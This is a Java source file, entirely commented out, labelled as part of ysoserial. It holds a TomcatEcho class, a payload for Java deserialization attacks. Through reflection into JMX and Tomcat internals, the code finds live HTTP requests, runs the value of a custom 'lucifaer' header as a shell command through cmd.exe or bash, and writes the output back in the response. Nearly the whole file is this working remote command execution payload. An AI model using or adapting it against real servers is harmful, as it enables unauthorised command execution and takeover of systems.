/*
package ysoserial;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.jmx.mbeanserver.Repository;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import org.apache.coyote.Request;
import org.apache.tomcat.util.modeler.Registry;
import org.apache.tomcat.util.buf.ByteChunk;

import javax.management.MBeanServer;
import javax.management.ObjectName;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import java.util.*;

public class TomcatEcho extends AbstractTranslet {
    public TomcatEcho() {
        try {
            MBeanServer mBeanServer = Registry.getRegistry(null, null).getMBeanServer();
            Field field = Class.forName("com.sun.jmx.mbeanserver.JmxMBeanServer").getDeclaredField("mbsInterceptor");
            field.setAccessible(true);
            Object mbsInterceptor = field.get(mBeanServer);

            field = Class.forName("com.sun.jmx.interceptor.DefaultMBeanServerInterceptor").getDeclaredField("repository");
            field.setAccessible(true);
            Repository repository = (Repository) field.get(mbsInterceptor);
            Set<NamedObject> set = repository.query(new ObjectName("*:type=GlobalRequestProcessor,name=\"http*\""), null);

            Iterator<NamedObject> it = set.iterator();
            while (it.hasNext()) {
                NamedObject namedObject = it.next();
                field = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("name");
                field.setAccessible(true);
                ObjectName flag = (ObjectName) field.get(namedObject);
                String canonicalName = flag.getCanonicalName();

                field = Class.forName("com.sun.jmx.mbeanserver.NamedObject").getDeclaredField("object");
                field.setAccessible(true);
                Object obj = field.get(namedObject);

                field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
                field.setAccessible(true);
                Object resource = field.get(obj);

                field = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                field.setAccessible(true);
                ArrayList processors = (ArrayList) field.get(resource);

                field = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                field.setAccessible(true);
                for (int i=0; i < processors.size(); i++) {
                    Request request = (Request) field.get(processors.get(i));
                    String header = request.getHeader("lucifaer");
                    System.out.println("cmds is:" + header);
                    System.out.println(header == null);
                    if (header != null && !header.equals("")) {
//                        String[] cmds = new String[] {"/bin/bash", "-c", header};
                        String[] cmds = new String[] {"cmd.exe", "/c", header};
                        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                        Scanner s = new Scanner(in).useDelimiter("\\a");
                        String out = "";

                        while (s.hasNext()) {
                            out += s.next();
                        }

                        byte[] buf = out.getBytes();
                        if (canonicalName.contains("nio")) {
                            ByteBuffer byteBuffer = ByteBuffer.wrap(buf);
//                    request.getResponse().setHeader("echo", out);
                            request.getResponse().doWrite(byteBuffer);
                            request.getResponse().getBytesWritten(true);
                        }
                        else if (canonicalName.contains("bio")) {
                            //tomcat 7使用需要使用ByteChunk来将byte写入
                            ByteChunk byteChunk = new ByteChunk();
                            byteChunk.setBytes(buf, 0, buf.length);
                            request.getResponse().doWrite(byteChunk);
                            request.getResponse().getBytesWritten(true);
                        }

                    }
                }
            }

        }catch (Throwable throwable) {
            throwable.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    public static void main(String[] args) throws Exception{
        new TomcatEcho();
    }
}

*/
